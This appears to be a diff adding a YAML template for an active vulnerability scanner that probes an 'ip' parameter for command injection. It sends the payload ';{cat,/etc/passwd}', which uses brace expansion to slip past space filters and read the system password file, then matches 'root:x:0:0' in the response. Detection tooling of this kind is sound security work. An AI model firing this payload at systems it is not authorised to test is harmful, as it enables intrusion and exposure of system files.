@@ -1,0 +1,20 @@
+id: patt-cmdi-brace-01-ip
+name: 'PATT cmdi patt-cmdi-brace-01 via ip'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - patt
+  - filterspace
+description: 'PATT Bypass With Brace Expansion: comma as space. [patt:patt-cmdi-brace-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      ip:
+        - ';{cat,/etc/passwd}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
